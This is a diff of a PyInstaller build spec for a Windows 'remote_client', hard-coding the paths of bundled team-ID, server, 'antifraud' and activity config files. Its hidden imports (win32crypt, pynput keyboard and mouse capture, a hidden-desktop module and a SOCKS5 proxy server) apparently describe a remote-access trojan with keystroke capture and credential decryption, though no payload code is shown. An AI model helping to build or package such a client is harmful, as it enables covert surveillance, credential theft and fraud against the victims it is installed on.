@@ -1,26 +1,7 @@
 # -*- mode: python ; coding: utf-8 -*-
-import os
-from pathlib import Path
-
 from PyInstaller.utils.hooks import collect_all
 
-base_dir = Path(__file__).resolve().parent
-entry_script = base_dir / "client.py"
-if not entry_script.exists():
-    entry_script = base_dir / "remote_client" / "main.py"
-
-datas = []
-asset_root = os.getenv("RC_BUILD_ASSET_DIR", "").strip()
-candidate_roots = []
-if asset_root:
-    candidate_roots.append(Path(asset_root) / "remote_client")
-candidate_roots.extend([base_dir / "remote_client", base_dir])
-for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
-    for root in candidate_roots:
-        candidate = root / filename
-        if candidate.exists():
-            datas.append((str(candidate), "remote_client"))
-            break
+datas = [('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_activity.env', 'remote_client')]
 binaries = []
 hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
 tmp_ret = collect_all('pynput')
@@ -38,7 +19,7 @@ datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
 
 
 a = Analysis(
-    [str(entry_script)],
+    ['C:\\Users\\USER\\remote_controller\\client\\client.py'],
     pathex=[],
     binaries=binaries,
     datas=datas,
